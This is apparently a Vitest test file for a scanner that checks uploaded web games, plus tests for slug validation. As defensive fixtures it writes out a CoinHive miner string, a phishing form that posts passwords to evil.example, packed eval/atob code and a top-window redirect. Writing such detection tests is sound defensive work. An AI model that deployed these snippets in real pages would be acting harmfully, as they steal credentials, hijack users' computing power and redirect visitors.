import { describe, expect, it } from "vitest";
import { checkSlug, decide, slugify, staticScan } from "@zaisma/core";

const rules = (files: { path: string; text: string }[]) => staticScan(files).findings.map((f) => `${f.severity}:${f.code}`);

describe("static scan", () => {
  it("finds nothing worrying in a plain game", () => {
    const r = staticScan([{ path: "index.html", text: '<html xmlns="http://www.w3.org/1999/xhtml"><canvas></canvas><script src="game.js"></script>' }]);
    expect(r.findings).toEqual([]);
    expect(decide(r.findings)).toBe("approved");
  });

  it("rejects crypto miners", () => {
    const f = staticScan([{ path: "m.js", text: 'var miner = new CoinHive.Anonymous("key"); connect("stratum+tcp://pool.example:3333")' }]).findings;
    expect(decide(f)).toBe("rejected");
  });

  it("holds phishing forms and password fields", () => {
    expect(rules([{ path: "index.html", text: '<form action="https://evil.example/steal"><input type="password" name="p"></form>' }])).toEqual(
      expect.arrayContaining(["hold:password_field", "hold:external_form"]),
    );
  });

  it("holds packed code and top-window redirects", () => {
    expect(rules([{ path: "a.js", text: "eval(function(p,a,c,k,e,d){return p}('x',1,1,'',0,{}))" }])).toContain("hold:packed_code");
    expect(rules([{ path: "a.js", text: "eval(atob('YWxlcnQoMSk='))" }])).toContain("hold:packed_code");
    expect(rules([{ path: "a.js", text: 'top.location.href = "https://evil.example"' }])).toContain("hold:top_navigation");
    expect(rules([{ path: "a.js", text: "if (top.location === self.location) {}" }])).not.toContain("hold:top_navigation");
  });

  it("lists outside hosts without counting file names", () => {
    const r = staticScan([{ path: "index.html", text: '<script src="https://cdn.jsdelivr.net/npm/three.min.js"></script><script src="three.min.js"></script>' }]);
    expect(r.outsideHosts).toEqual(["cdn.jsdelivr.net"]);
    expect(decide(r.findings)).toBe("approved");
  });
});

describe("slugs", () => {
  it("accepts DNS-safe names and refuses reserved ones", () => {
    expect(checkSlug("shard-dodge")).toBeNull();
    expect(checkSlug("ab")).not.toBeNull();
    expect(checkSlug("-bad")).not.toBeNull();
    expect(checkSlug("Bad")).not.toBeNull();
    expect(checkSlug("admin")).toMatch(/reserved/);
    expect(slugify("  Shard Dodge: Deluxe! ")).toBe("shard-dodge-deluxe");
  });
});
